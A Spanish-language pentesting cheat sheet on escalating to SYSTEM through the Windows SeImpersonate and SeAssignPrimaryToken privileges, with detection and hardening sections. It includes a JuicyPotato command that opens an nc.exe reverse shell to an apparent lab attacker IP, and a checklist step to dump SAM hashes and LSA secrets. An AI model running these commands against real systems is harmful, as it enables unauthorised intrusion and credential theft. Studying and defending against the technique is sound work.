# SeImpersonate y SeAssignPrimaryToken


* Windows maneja *tokens* de acceso (Access Tokens) que describen el contexto de seguridad de un proceso (SIDs, grupos, privilegios, etc.).
* **SeImpersonatePrivilege** permite a un proceso **impersonar** (tomar el contexto de) otro usuario después de que ese usuario se haya autenticado.
* **SeAssignPrimaryTokenPrivilege** permite **asignar o crear un token primario** para un proceso (CreateProcessAsUser-like), y es más poderoso y restringido.
* Ambos privilegios son potentes porque permiten escalar privilegios localmente: e.g., transformar un proceso con privilegios de servicio en uno con contexto `NT AUTHORITY\SYSTEM`.
* Ataques clásicos: **JuicyPotato**, **RoguePotato**, **PrintSpoofer** — abusan de servicios localmente ejecutándose como SYSTEM que conectan a un objeto RPC/COM y permiten la exfiltración/uso del token.

---

## Conceptos clave

* **Token de acceso (Access Token):** estructura en memoria que contiene identidad del usuario (SID), grupos, privilegios y lista de restricción.
* **Impersonation vs Primary Token:**

  * *Impersonation token* — usado por un thread para actuar como cliente; no siempre puede crear procesos.
  * *Primary token* — token asignado a un proceso, permite crear procesos con ese contexto.
* **SeImpersonatePrivilege:** concede la capacidad de `Impersonate a client after authentication`.
* **SeAssignPrimaryTokenPrivilege:** concede la capacidad de `Replace a process level token` (crear/colocar tokens primarios).
* **CreateProcessWithTokenW** y **CreateProcessAsUser** son APIs que requieren distintos privilegios: CreateProcessWithTokenW necesita token válido y el llamador debe poder usarlo (normalmente SeImpersonate puede ser suficiente en combinaciones con técnicas de token stealing); CreateProcessAsUser requiere SeAssignPrimaryToken.

---

## ¿Por qué son críticos en pentesting?

* Muchos servicios (IIS, SQL Server, servicios Windows, spooler) corren con cuentas de servicio que tienen **SeImpersonate** o **SeAssignPrimaryToken** habilitado.
* Si obtenés ejecución en el contexto de uno de esos servicios (ej. `nt service\mssql$sqlexpress01`, `iis apppool\defaultapppool`), podés comprobar inmediatamente si el servicio tiene dichas privilegios y, si es positivo, intentar escalada rápida a `SYSTEM`.
* Estas escaladas son fáciles y rápidas: pocos comandos y herramientas públicas (JuicyPotato, PrintSpoofer).

---

## Flujo típico de explotación (alto nivel)

1. Obtención de RCE en contexto de servicio no-SYSTEM (ej. shell vía `xp_cmdshell`, web shell en IIS, Jenkins RCE).
2. Ejecutar `whoami /priv` o PowerShell para listar privilegios.
3. Si aparece `SeImpersonatePrivilege` (Enabled) o `SeAssignPrimaryTokenPrivilege` → preparar exploit (JuicyPotato/PrintSpoofer).
4. Subir ejecutable de explotación (JuicyPotato.exe / PrintSpoofer.exe) + binarios auxiliares (nc.exe o reverse shell payload).
5. Ejecutar exploit apuntando a COM server id / listening port apropiado.
6. Si tiene éxito, obtendrás un proceso con token `NT AUTHORITY\SYSTEM` (shell remoto) o CreateProcessAsUser OK.

---

## Ejemplo práctico (resumen de pasos usados en labs)

* Comprobar privilegios:

  ```powershell
  whoami /priv
  # o en PowerShell
  Get-Process -Id $PID | ForEach-Object { [Security.Principal.WindowsIdentity]::GetCurrent().Groups }
  ```
* Descargar y ejecutar JuicyPotato (ejemplo):

  ```cmd
  JuicyPotato.exe -l 53375 -p C:\Windows\System32\cmd.exe -a "/c C:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
  ```
* Resultado esperado: `CreateProcessWithTokenW OK` y conexión reversa con `NT AUTHORITY\SYSTEM`.

> Nota: Ubicaciones y flags varían según la herramienta y la versión de Windows. JuicyPotato deja de funcionar en versiones recientes; PrintSpoofer o RoguePotato pueden funcionar en builds más nuevas.

---

## Artefactos y pistas de detección (logs/telemetría)

* **Eventos de seguridad**:

  * 4624/4634: logons (especialmente por servicios y SYSTEM).
  * 4688: proceso creado (buscar procesos inusuales lanzados por servicios: cmd.exe, powershell.exe, nc.exe, rundll32.exe desde servicios).
* **Sysmon (recomendado)**:

  * EventID 1 (Process Create): observar procesos hijo de servicios (svchost, sqlservr.exe, w3wp.exe) que lancen cmd.exe/powershell.
  * EventID 11/12/7: actividad en archivos subidos.
  * EventID 3 (Network) y 10 (ProcessAccess) para rastrear acceso entre procesos.
* **EPP/EDR**: creación de procesos con tokens differentes o llamadas a CreateProcessWithTokenW pueden disparar firmas.
* **Named pipes / COM bindings**: herramientas Potato crean listeners (named pipes / RPC endpoints) — revisá conexiones IPC y registros de server COM.

---

## Comprobaciones y hunting (quick wins)

* Desde una shell con permisos: `whoami /priv`.
* Listar privilegios en objetos y servicios: `sc qc <servicename>`, revisar `Log On As`.
* Buscar cuentas con SeImpersonate habilitado (PowerShell):

  ```powershell
  # Requires AD / local audit scripts; para local: dump privileges with ntdsutil or tools como AccessChk
  accesschk.exe -k *  # muestra privilegios en cuentas/servicios (sysinternals accesschk)
  ```
* En entorno AD, buscar GPOs o hardening que remuevan SeImpersonate de grupos no necesarios.

---

## Mitigaciones y hardening

* **Eliminar SeImpersonate y SeAssignPrimaryToken** de cuentas que no lo necesitan (Local Security Policy -> User Rights Assignment) o mediante GPO.
* **Principio de menor privilegio**: los servicios no deberían ejecutarse con cuentas que necesiten esos privilegios.
* **Segregar servicios**: evitar usar cuentas con amplios derechos en servicios accesibles por usuarios/clients.
* **Harden LSASS/Protecciones**: PPL, Credential Guard en entornos soportados.
* **EDR / Sysmon**: monitorizar creación inusual de procesos y llamadas a APIs sensibles (CreateProcessWithTokenW, CreateProcessAsUser).
* **Aplicar Application Whitelisting** y control de ejecución en servidores críticos.

---

## 9. Checklist cuando se encuentra RCE en servicio

1. `whoami /priv` — ¿SeImpersonate o SeAssignPrimaryToken aparecen?
2. Subir JuicyPotato/PrintSpoofer (o usar versiones publicadas) a ruta temporal.
3. Ejecutar con parámetros apropiados (puerto COM/CLSID, payload).
4. Si falla, probar alternativas (PrintSpoofer, RoguePotato, distintos CLSIDs).
5. Si obtienes SYSTEM, recolectar evidencia y continuar post-exploitation con cuidado (hashes SAM, LSA secrets si aplica).
6. Documentar y reportar: qué cuenta tenía el privilegio, cómo se explotó, recomendaciones de mitigación.

---

## Recursos recomendados

* Artículos técnicas sobre JuicyPotato, PrintSpoofer, RoguePotato y token impersonation.
* Documentación Microsoft sobre tokens y privilegios (Token, CreateProcessWithTokenW, CreateProcessAsUser).



*Pista: usa este lienzo como guía rápida en tus laboratorios. Para cada objetivo real, adapta los comandos y asegúrate de trabajar siempre en entornos autorizados y aislados.*
